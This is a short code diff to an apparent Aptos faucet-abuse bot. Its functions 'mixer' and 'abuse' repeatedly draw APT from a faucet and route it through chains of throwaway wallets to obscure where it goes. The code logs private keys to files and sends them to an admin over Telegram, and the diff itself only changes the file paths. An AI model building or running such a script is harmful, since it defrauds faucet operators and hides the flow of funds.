@@ -101,7 +101,7 @@ const mixer = async (faucet: AptosAccount, wallet: AptosAccount, amount, count =
 
   await sendSomeAPT(faucet, mixers[0], amount)
   for (let i = 0; i < mixers.length - 1; i++) {
-    await fs.appendFile('./wallets/temps.txt', `${mixers[i].toPrivateKeyObject().privateKeyHex}\n`)
+    await fs.appendFile('/wallets/temps.txt', `${mixers[i].toPrivateKeyObject().privateKeyHex}\n`)
     await sendAllAPT(mixers[i], mixers[i+1])
     await delay(1500)
   }
@@ -142,7 +142,7 @@ const abuse = async () => {
         await sendAllAPT(wallet, end)
 
         console.log('Wait some time and start again!\nPress CONTROL+C in two seconds to break script!')
-        await fs.appendFile('./wallets/wallets.txt', `${wallet.toPrivateKeyObject().privateKeyHex}\n`)
+        await fs.appendFile('/wallets/wallets.txt', `${wallet.toPrivateKeyObject().privateKeyHex}\n`)
         bot.telegram.sendMessage(ADMIN, wallet.toPrivateKeyObject().privateKeyHex)
         await delay(GLOBAL_DELAY)
       }
